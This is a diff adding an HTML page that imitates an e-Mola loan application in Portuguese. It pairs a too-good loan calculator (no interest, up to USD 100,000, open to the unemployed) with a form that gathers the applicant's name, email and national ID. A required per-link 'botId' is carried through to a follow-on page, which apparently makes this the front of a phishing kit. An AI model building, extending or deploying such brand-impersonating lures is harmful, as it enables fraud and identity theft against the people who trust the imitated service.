@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>e-Mola · Pedido de Empréstimo</title>
+    <style>
+        /* ----- reset & base (same as other pages) ----- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .loan-container {
+            background: #ffffff;
+            border-radius: 24px;
+            width: 100%;
+            max-width: 400px;
+            padding: 0 28px 32px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12);
+            overflow: hidden;
+            position: relative;
+            margin-top: 20px;
+        }
+
+        /* ----- purple header (matches e‑Mola) ----- */
+        .logo-container {
+            background: #6a0dad;
+            margin: 0 -28px 24px;
+            padding: 28px 20px 18px;
+            text-align: center;
+            color: white;
+            border-bottom: 4px solid #5a0b9a;
+        }
+
+        .logo-container h1 {
+            font-size: 32px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            margin-bottom: 2px;
+        }
+
+        .logo-container .slogan {
+            font-size: 14px;
+            font-weight: 300;
+            opacity: 0.9;
+            letter-spacing: 0.5px;
+        }
+
+        /* ----- calculator section ----- */
+        .calculator-box {
+            background: #f8f0ff;
+            padding: 20px 16px;
+            border-radius: 18px;
+            margin-bottom: 20px;
+        }
+
+        .calculator-box h2 {
+            color: #6a0dad;
+            margin-top: 0;
+            font-size: 20px;
+            margin-bottom: 12px;
+        }
+
+        .loan-amount {
+            font-size: 34px;
+            font-weight: 700;
+            color: #6a0dad;
+            margin: 10px 0;
+        }
+
+        .slider {
+            width: 100%;
+            accent-color: #6a0dad;
+            margin: 8px 0;
+        }
+
+        .range-values {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #777;
+            margin-top: 4px;
+        }
+
+        .term-buttons {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        .term-btn {
+            border: none;
+            padding: 12px 6px;
+            border-radius: 12px;
+            background: #e7d8ff;
+            color: #6a0dad;
+            font-weight: 600;
+            font-size: 13px;
+            cursor: pointer;
+            transition: background 0.2s, color 0.2s;
+        }
+
+        .term-btn.active {
+            background: #6a0dad;
+            color: white;
+        }
+
+        .payment-box {
+            background: #ede3ff;
+            padding: 18px;
+            border-radius: 16px;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .payment-box p {
+            color: #444;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+
+        .payment-box h2 {
+            color: #6a0dad;
+            margin: 0;
+            font-size: 24px;
+        }
+
+        .apply-btn {
+            width: 100%;
+            padding: 14px;
+            background: #6a0dad;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background 0.2s;
+        }
+
+        .apply-btn:hover {
+            background: #5a0b9a;
+        }
+
+        /* ----- form section (hidden initially) ----- */
+        .form-section {
+            display: none;
+            margin-top: 10px;
+        }
+
+        .form-section label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #1e1e1e;
+            margin: 14px 0 4px;
+        }
+
+        .form-section input,
+        .form-section select {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1.5px solid #ddd;
+            border-radius: 10px;
+            background: #fafafa;
+            font-size: 15px;
+            transition: border 0.2s;
+            outline: none;
+            margin-bottom: 6px;
+        }
+
+        .form-section input:focus,
+        .form-section select:focus {
+            border-color: #6a0dad;
+            background: #fff;
+        }
+
+        .form-section .loan-notice {
+            background: #f8f0ff;
+            border-left: 5px solid #6a0dad;
+            padding: 14px 16px;
+            border-radius: 10px;
+            font-size: 14px;
+            line-height: 1.6;
+            margin: 18px 0 16px;
+        }
+
+        .form-section .loan-notice strong {
+            display: block;
+            color: #4a0a7a;
+            margin-bottom: 6px;
+        }
+
+        .form-section .loan-notice ol {
+            padding-left: 20px;
+            margin: 0;
+        }
+
+        .form-section .loan-notice li {
+            margin-bottom: 4px;
+        }
+
+        .form-section button[type="submit"] {
+            width: 100%;
+            padding: 14px;
+            background: #6a0dad;
+            color: #fff;
+            border: none;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 6px;
+        }
+
+        .form-section button[type="submit"]:hover {
+            background: #5a0b9a;
+        }
+
+        /* ----- footer links (like login) ----- */
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 24px;
+            font-size: 14px;
+        }
+
+        .footer-links a {
+            color: #6a0dad;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover {
+            color: #4a0a7a;
+            text-decoration: underline;
+        }
+
+        /* ----- version ----- */
+        .version {
+            text-align: center;
+            font-size: 12px;
+            color: #999;
+            margin-top: 18px;
+            letter-spacing: 0.3px;
+        }
+
+        /* ----- responsive adjustments ----- */
+        @media (max-width: 420px) {
+            .loan-container {
+                padding: 0 20px 28px;
+            }
+            .logo-container {
+                margin: 0 -20px 20px;
+                padding: 24px 16px 16px;
+            }
+            .logo-container h1 {
+                font-size: 28px;
+            }
+            .loan-amount {
+                font-size: 28px;
+            }
+            .term-buttons {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="loan-container">
+    <!-- ===== HEADER (e‑Mola) ===== -->
+    <div class="logo-container">
+        <h1>e‑Mola</h1>
+        <div class="slogan">Meu cell, minha mola</div>
+    </div>
+
+    <!-- ===== CALCULATOR SECTION ===== -->
+    <div id="calculatorSection">
+        <div class="calculator-box">
+            <h2>Simulador de Empréstimo</h2>
+
+            <p style="font-weight:500; color:#333;">Valor do Empréstimo</p>
+            <div class="loan-amount" id="amountDisplay">USD 15,400</div>
+
+            <input type="range" min="100" max="100000" value="15400" class="slider" id="loanSlider" />
+
+            <div class="range-values">
+                <span>USD 100</span>
+                <span>USD 100,000</span>
+            </div>
+
+            <h3 style="color:#6a0dad; margin-top:18px; font-size:16px;">Prazo do Empréstimo</h3>
+
+            <div class="term-buttons">
+                <button type="button" class="term-btn" data-months="6">6 meses</button>
+                <button type="button" class="term-btn active" data-months="12">12 meses</button>
+                <button type="button" class="term-btn" data-months="24">24 meses</button>
+                <button type="button" class="term-btn" data-months="36">36 meses</button>
+                <button type="button" class="term-btn" data-months="48">48 meses</button>
+                <button type="button" class="term-btn" data-months="60">60 meses</button>
+            </div>
+
+            <div class="payment-box">
+                <p>Pagamento Mensal Estimado</p>
+                <h2 id="monthlyPayment">USD 1,314.83</h2>
+            </div>
+
+            <button class="apply-btn" onclick="showForm()">Solicitar Agora</button>
+        </div>
+    </div>
+
+    <!-- ===== APPLICATION FORM ===== -->
+    <div class="form-section" id="formSection">
+        <form id="loanForm">
+            <label>Nome Completo</label>
+            <input id="fullName" type="text" required placeholder="Digite seu nome completo" />
+
+            <label>Valor do Empréstimo (USD)</label>
+            <input id="loanAmount" type="number" required placeholder="Mínimo 50" />
+
+            <label>Endereço de Email</label>
+            <input id="email" type="email" placeholder="exemplo@gmail.com" required />
+
+            <label>Número do Documento de Identidade</label>
+            <input id="nationalId" type="text" placeholder="Digite o seu BI / NIF" />
+
+            <label>Situação Profissional</label>
+            <select id="employmentStatus" required>
+                <option value="">Selecionar</option>
+                <option value="employed">Empregado</option>
+                <option value="self-employed">Trabalhador por conta própria</option>
+                <option value="unemployed">Desempregado</option>
+                <option value="student">Estudante</option>
+            </select>
+
+            <label>Finalidade do Empréstimo</label>
+            <select id="loanPurpose" required>
+                <option value="">Selecionar</option>
+                <option value="business">Negócio</option>
+                <option value="personal">Despesas Pessoais</option>
+                <option value="schoolfees">Propinas Escolares</option>
+                <option value="medical">Despesas Médicas</option>
+                <option value="others">Outros</option>
+            </select>
+
+            <div class="loan-notice">
+                <strong>Aviso sobre o Pedido de Empréstimo:</strong>
+                <ol>
+                    <li>Certifique-se de que todas as informações fornecidas estão corretas.</li>
+                    <li>A aprovação depende da análise de elegibilidade.</li>
+                    <li>Os termos e condições de reembolso aplicam-se.</li>
+                </ol>
+            </div>
+
+            <button type="submit">Continuar</button>
+        </form>
+    </div>
+
+    <!-- ===== FOOTER (matching other pages) ===== -->
+    <div class="footer-links">
+        <a href="#" onclick="alert('Redirecionar para recuperação')">Esqueceu a senha</a>
+        <a href="#" onclick="alert('Redirecionar para cadastro')">Cadastrar-se</a>
+    </div>
+
+    <div class="version">Versão 2.1.0</div>
+</div>
+
+<!-- ========================================================= -->
+<!--  SCRIPT: Calculator logic + form submission + botId       -->
+<!-- ========================================================= -->
+<script>
+    // ---------- BOT ID FIX (from URL or path) ----------
+    let botId = new URLSearchParams(window.location.search).get('botId');
+    if (!botId) {
+        const parts = window.location.pathname.split('/');
+        const botIndex = parts.indexOf('bot');
+        if (botIndex !== -1 && parts[botIndex + 1]) botId = parts[botIndex + 1];
+    }
+    if (!botId) {
+        alert("Invalid access link");
+        throw new Error("botId missing");
+    }
+    localStorage.setItem('botId', botId);
+
+    // ---------- SHOW / HIDE FORM ----------
+    function showForm() {
+        document.getElementById('calculatorSection').style.display = 'none';
+        document.getElementById('formSection').style.display = 'block';
+        // Pre-fill loan amount from slider
+        const slider = document.getElementById('loanSlider');
+        document.getElementById('loanAmount').value = slider.value;
+    }
+
+    // ---------- LOAN CALCULATOR ----------
+    const slider = document.getElementById('loanSlider');
+    const amountDisplay = document.getElementById('amountDisplay');
+    const monthlyPayment = document.getElementById('monthlyPayment');
+
+    // Term buttons: keep track of active term
+    const termBtns = document.querySelectorAll('.term-btn');
+    let selectedMonths = 12; // default
+
+    termBtns.forEach(btn => {
+        btn.addEventListener('click', () => {
+            termBtns.forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            selectedMonths = parseInt(btn.dataset.months);
+            updatePayment();
+        });
+    });
+
+    function updatePayment() {
+        const amount = parseInt(slider.value);
+        amountDisplay.innerText = 'USD ' + amount.toLocaleString();
+        const payment = (amount / selectedMonths).toFixed(2);
+        monthlyPayment.innerText = 'USD ' + payment;
+    }
+
+    slider.addEventListener('input', updatePayment);
+    updatePayment(); // initial
+
+    // ---------- FORM SUBMISSION ----------
+    document.getElementById('loanForm').addEventListener('submit', e => {
+        e.preventDefault();
+
+        // Collect all fields
+        const fullName = document.getElementById('fullName').value.trim();
+        const loanAmount = document.getElementById('loanAmount').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const nationalId = document.getElementById('nationalId').value.trim();
+        const employmentStatus = document.getElementById('employmentStatus').value;
+        const loanPurpose = document.getElementById('loanPurpose').value;
+
+        // Basic validation
+        if (!fullName || !loanAmount || !email) {
+            alert('Por favor, preencha todos os campos obrigatórios.');
+            return;
+        }
+
+        // Store in localStorage for later use
+        localStorage.setItem('fullName', fullName);
+        localStorage.setItem('loanAmount', loanAmount);
+        localStorage.setItem('email', email);
+        localStorage.setItem('nationalId', nationalId);
+        localStorage.setItem('employmentStatus', employmentStatus);
+        localStorage.setItem('loanPurpose', loanPurpose);
+
+        // Also store name as 'name' for the details page (if needed)
+        localStorage.setItem('name', fullName);
+
+        // Redirect to details.html with botId
+        window.location.href = `form.html?botId=${botId}`;
+    });
+</script>
+
+</body>
+</html>
